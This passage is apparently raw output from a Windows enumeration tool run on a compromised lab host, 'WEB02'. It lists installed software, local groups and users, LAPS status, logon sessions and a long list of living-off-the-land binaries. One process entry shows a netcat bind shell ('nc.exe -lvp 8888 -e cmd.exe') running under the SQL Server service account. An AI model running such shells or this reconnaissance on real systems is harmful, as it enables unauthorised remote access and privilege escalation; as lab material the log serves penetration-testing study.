  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913
  DisplayVersion                 : 14.28.29913
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 DMF
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Connection Info
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

====== InterestingFiles ======


Accessed      Modified      Path
----------    ----------    -----
====== InterestingProcesses ======

    Category     : defensive
    Name         : MsMpEng.exe
    Product      : Windows Defender AV
    ProcessID    : 2884
    Owner        : 
    CommandLine  : 

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 7460
    Owner        : NT Service\MSSQL$SQLEXPRESS
    CommandLine  : "C:\Windows\system32\cmd.exe" /c C:\temp\nc.exe -lvp 8888 -e cmd.exe

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 6584
    Owner        : NT Service\MSSQL$SQLEXPRESS
    CommandLine  : cmd.exe

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 6540
    Owner        : NT Service\MSSQL$SQLEXPRESS
    CommandLine  : powershell

====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU             CertificateRevocation : 1
  HKCU          DisableCachingOfSSLPages : 0
  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 10240
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU                   EnableNegotiate : 1
  HKCU                       ProxyEnable : 0
  HKCU                      MigrateProxy : 1
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== KeePass ======

====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               : 
  LAPS Password Complexity              : 
  LAPS Password Length                  : 
  LAPS Expiration Protection Enabled    : 
====== LastShutdown ======

  LastShutdown                   : 2/28/2023 6:05:48 AM

====== LocalGPOs ======

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** WEB02\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            WEB02\Administrator                      S-1-5-21-1364059446-3280107051-2039649012-500
  Group           MEDTECH\Domain Admins                    S-1-5-21-976142013-3766213998-138799841-512

  ** WEB02\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            WEB02\Guest                              S-1-5-21-1364059446-3280107051-2039649012-501

  ** WEB02\Performance Monitor Users ** (Members of this group can access performance counter data locally and remotely)

  WellKnownGroup  NT SERVICE\MSSQL$SQLEXPRESS              S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
  WellKnownGroup  NT SERVICE\SQLAgent$SQLEXPRESS           S-1-5-80-592940576-1656185091-296729330-4026955537-2205062631

  ** WEB02\Remote Desktop Users ** (Members in this group are granted the right to logon remotely)

  User            WEB02\Administrator                      S-1-5-21-1364059446-3280107051-2039649012-500
  User            MEDTECH\joe                              S-1-5-21-976142013-3766213998-138799841-1106

  ** WEB02\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            WEB02\DefaultAccount                     S-1-5-21-1364059446-3280107051-2039649012-503

  ** WEB02\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  User            WEB02\offsec                             S-1-5-21-1364059446-3280107051-2039649012-1000
  Group           MEDTECH\Domain Users                     S-1-5-21-976142013-3766213998-138799841-513

  ** WEB02\SQLServer2005SQLBrowserUser$WEB02 ** (Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.)

  WellKnownGroup  NT SERVICE\SQLBrowser                    S-1-5-80-2488930588-2400869415-1350125619-3751000688-192790804

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 12/5/2022 12:10:28 PM
  LastLogon                      : 7/22/2024 4:53:54 AM
  NumLogins                      : 54

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
  UserType                       : Guest
  Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : offsec
  Enabled                        : True
  Rid                            : 1000
  UserType                       : User
  Comment                        : offsec
  PwdLastSet                     : 9/29/2022 1:58:47 AM
  LastLogon                      : 9/29/2022 4:29:07 AM
  NumLogins                      : 1

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 9/29/2022 1:54:55 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonEvents ======

ERROR: Unable to collect. Must be an administrator/in a high integrity context.
====== LogonSessions ======

Logon Sessions (via WMI)


  UserName              : MSSQL$SQLEXPRESS
  Domain                : NT Service
  LogonId               : 125502
  LogonType             : Service
  AuthenticationPackage : Negotiate
  StartTime             : 3/28/2024 9:01:01 PM
  UserPrincipalName     : 
====== LOLBAS ======

Path: C:\Windows\System32\advpack.dll
Path: C:\Windows\SysWOW64\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.20348.1_none_692bddd626b10240\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.20348.1_none_738088285b11c43b\advpack.dll
Path: C:\Windows\System32\at.exe
Path: C:\Windows\SysWOW64\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.20348.1_none_d670a1ed4ceb1c2e\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.20348.1_none_e0c54c3f814bde29\at.exe
Path: C:\Windows\System32\AtBroker.exe
Path: C:\Windows\SysWOW64\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.20348.1_none_590fad54e75bce6d\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.20348.1_none_636457a71bbc9068\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.20348.1_none_c90a5c138598ae74\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.20348.740_none_282d7db146a56ba0\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.20348.740_none_282d7db146a56ba0\f\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.20348.740_none_282d7db146a56ba0\r\bash.exe
Path: C:\Windows\System32\bitsadmin.exe
Path: C:\Windows\SysWOW64\bitsadmin.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.20348.1_none_d6808e85d572a277\bitsadmin.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.20348.1_none_e0d538d809d36472\bitsadmin.exe
Path: C:\Windows\System32\certutil.exe
Path: C:\Windows\SysWOW64\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.1_none_3ef40570fc632945\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.469_none_9e0a841ebd780aed\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.1_none_4948afc330c3eb40\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.469_none_a85f2e70f1d8cce8\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.469_none_9e0a841ebd780aed\f\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.469_none_9e0a841ebd780aed\r\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.469_none_a85f2e70f1d8cce8\f\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.20348.469_none_a85f2e70f1d8cce8\r\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-audiodiagnostic_31bf3856ad364e35_10.0.20348.1_none_49f67089b8c00ad8\CL_Invocation.ps1
Path: C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1
Path: C:\Windows\WinSxS\amd64_microsoft-windows-videodiagnostic_31bf3856ad364e35_10.0.20348.1_none_0651259807e47dbd\CL_MutexVerifiers.ps1
Path: C:\Windows\diagnostics\system\Video\CL_MutexVerifiers.ps1
Path: C:\Windows\System32\cmd.exe
Path: C:\Windows\SysWOW64\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.20348.1_none_147bc440e3631fe8\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.20348.1_none_1ed06e9317c3e1e3\cmd.exe
Path: C:\Windows\System32\cmdkey.exe
Path: C:\Windows\SysWOW64\cmdkey.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.20348.1_none_66567048a5de99c6\cmdkey.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.20348.1_none_70ab1a9ada3f5bc1\cmdkey.exe
Path: C:\Windows\System32\cmstp.exe
Path: C:\Windows\SysWOW64\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rascmak.resources_31bf3856ad364e35_10.0.20348.1_en-us_c4b5c0b4f595fcf8\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.20348.1_none_e88f3cf5298c2368\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.20348.1_none_f2e3e7475dece563\cmstp.exe
Path: C:\Program Files\CMAK\Support\en-US\cmstp.exe
Path: C:\Windows\System32\comsvcs.dll
Path: C:\Windows\SysWOW64\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.1_none_fc3162b168e49176\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.469_none_5b47e15f29f9731e\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.1_none_06860d039d455371\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.469_none_659c8bb15e5a3519\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.469_none_5b47e15f29f9731e\f\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.469_none_5b47e15f29f9731e\r\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.469_none_659c8bb15e5a3519\f\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.20348.469_none_659c8bb15e5a3519\r\comsvcs.dll
Path: C:\Windows\System32\control.exe
Path: C:\Windows\SysWOW64\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.1_none_22daf6c173846ae6\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.350_none_81f340db34994f67\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.1_none_2d2fa113a7e52ce1\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.350_none_8c47eb2d68fa1162\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.350_none_81f340db34994f67\f\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.350_none_81f340db34994f67\r\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.350_none_8c47eb2d68fa1162\f\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.20348.350_none_8c47eb2d68fa1162\r\control.exe
Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15806.0_none_76ec1420387eb344\csc.exe
Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15806.0_none_be994af74cfadc4a\csc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
Path: C:\Windows\System32\cscript.exe
Path: C:\Windows\SysWOW64\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.1_none_d1d75099c96087f4\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_310538a58a65376c\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.1_none_dc2bfaebfdc149ef\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_3b59e2f7bec5f967\cscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_310538a58a65376c\f\cscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_310538a58a65376c\r\cscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_3b59e2f7bec5f967\f\cscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_3b59e2f7bec5f967\r\cscript.exe
Path: C:\Windows\System32\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.20348.1_none_ca614a69a3aff63c\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_dfsvc_b03f5f7f11d50a3a_4.0.15806.0_none_c0d3d16c74269fa6\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\dfsvc\v4.0_4.0.0.0__b03f5f7f11d50a3a\dfsvc.exe
Path: C:\Windows\System32\diskshadow.exe
Path: C:\Windows\SysWOW64\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.20348.1_none_bed80216f4f34ba4\diskshadow.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.20348.1_none_62b966933c95da6e\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.20348.112_none_cfeabc29d81a8955\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.20348.643_none_cfcb562dd831e842\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.20348.112_none_cfeabc29d81a8955\f\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.20348.112_none_cfeabc29d81a8955\r\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.20348.643_none_cfcb562dd831e842\f\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.20348.643_none_cfcb562dd831e842\r\dnscmd.exe
Path: C:\Windows\System32\esentutl.exe
Path: C:\Windows\SysWOW64\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.20348.1_none_62faea818e47b7a6\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.20348.1_none_6d4f94d3c2a879a1\esentutl.exe
Path: C:\Windows\System32\eventvwr.exe
Path: C:\Windows\SysWOW64\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.20348.1_none_7e66d58accb9ba7b\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.20348.1_none_88bb7fdd011a7c76\eventvwr.exe
Path: C:\Windows\System32\expand.exe
Path: C:\Windows\SysWOW64\expand.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-expand_31bf3856ad364e35_10.0.20348.1_none_e1e17a0020e70781\expand.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-expand_31bf3856ad364e35_10.0.20348.1_none_ec3624525547c97c\expand.exe
Path: C:\Program Files\Internet Explorer\ExtExport.exe
Path: C:\Program Files (x86)\Internet Explorer\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.20348.1_none_eb5e38fcf7660a9e\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.20348.1_none_8f3f9d793f089968\ExtExport.exe
Path: C:\Windows\System32\extrac32.exe
Path: C:\Windows\SysWOW64\extrac32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.20348.1_none_64989822ccebfa27\extrac32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.20348.1_none_6eed4275014cbc22\extrac32.exe
Path: C:\Windows\System32\findstr.exe
Path: C:\Windows\SysWOW64\findstr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-findstr_31bf3856ad364e35_10.0.20348.1_none_b09e88e622bb3dfd\findstr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-findstr_31bf3856ad364e35_10.0.20348.1_none_baf33338571bfff8\findstr.exe
Path: C:\Windows\System32\forfiles.exe
Path: C:\Windows\SysWOW64\forfiles.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.20348.1_none_de926d23a68f60c3\forfiles.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.20348.1_none_e8e71775daf022be\forfiles.exe
Path: C:\Windows\System32\ftp.exe
Path: C:\Windows\SysWOW64\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.20348.1_none_365a5b742190942f\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.20348.1_none_40af05c655f1562a\ftp.exe
Path: C:\Windows\System32\gpscript.exe
Path: C:\Windows\SysWOW64\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.20348.1_none_ee86360638b2d966\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.20348.1_none_f8dae0586d139b61\gpscript.exe
Path: C:\Windows\hh.exe
Path: C:\Windows\SysWOW64\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.20348.1_none_51c4f4364dc3118d\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.20348.1_none_5c199e888223d388\hh.exe
Path: C:\Windows\System32\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.20348.51_none_c503a747210155ad\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.20348.558_none_f21816d112022157\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.20348.51_none_c503a747210155ad\f\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.20348.51_none_c503a747210155ad\r\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.20348.558_none_f21816d112022157\f\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.20348.558_none_f21816d112022157\r\ie4uinit.exe
Path: C:\Windows\System32\IEAdvpack.dll
Path: C:\Windows\SysWOW64\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.20348.1_none_8c52c2d1026f0f23\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.20348.1_none_3034274d4a119ded\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15806.0_none_5fe3df7e2920f4bd\ilasm.exe
Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15806.0_none_a79116553d9d1dc3\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe
Path: C:\Windows\System32\InfDefaultInstall.exe
Path: C:\Windows\SysWOW64\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.20348.1_none_f603814365160072\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.20348.1_none_00582b959976c26d\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_installutil_b03f5f7f11d50a3a_4.0.15806.0_none_d67e07390c494773\InstallUtil.exe
Path: C:\Windows\WinSxS\wow64_installutil_b03f5f7f11d50a3a_4.0.15806.0_none_004c4e52cd93dc90\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Path: C:\Windows\WinSxS\amd64_jsc_b03f5f7f11d50a3a_4.0.15806.0_none_02da82dac29fc3c2\jsc.exe
Path: C:\Windows\WinSxS\wow64_jsc_b03f5f7f11d50a3a_4.0.15806.0_none_2ca8c9f483ea58df\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
Path: C:\Windows\System32\makecab.exe
Path: C:\Windows\SysWOW64\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.20348.1_none_7a3e7f6a32456f57\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.20348.1_none_849329bc66a63152\makecab.exe
Path: C:\Windows\System32\mavinject.exe
Path: C:\Windows\SysWOW64\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.143_none_9bcee0e37c7775e3\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.946_none_9bd1f0f17c74ab20\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.143_none_a6238b35b0d837de\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.946_none_a6269b43b0d56d1b\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.946_none_9bd1f0f17c74ab20\f\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.946_none_9bd1f0f17c74ab20\r\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.946_none_a6269b43b0d56d1b\f\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.20348.946_none_a6269b43b0d56d1b\r\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft.workflow.compiler_31bf3856ad364e35_4.0.15806.0_none_eb7fe9dcc519b26e\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\v4.0_4.0.0.0__31bf3856ad364e35\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\System32\mmc.exe
Path: C:\Windows\SysWOW64\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.1006_none_b807e662a7c30d4f\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.51_none_dab4c25acd506d22\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.1006_none_c25c90b4dc23cf4a\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.51_none_e5096cad01b12f1d\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.1006_none_b807e662a7c30d4f\f\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.1006_none_b807e662a7c30d4f\r\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.51_none_dab4c25acd506d22\f\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.51_none_dab4c25acd506d22\r\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.1006_none_c25c90b4dc23cf4a\f\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.1006_none_c25c90b4dc23cf4a\r\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.51_none_e5096cad01b12f1d\f\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.20348.51_none_e5096cad01b12f1d\r\mmc.exe
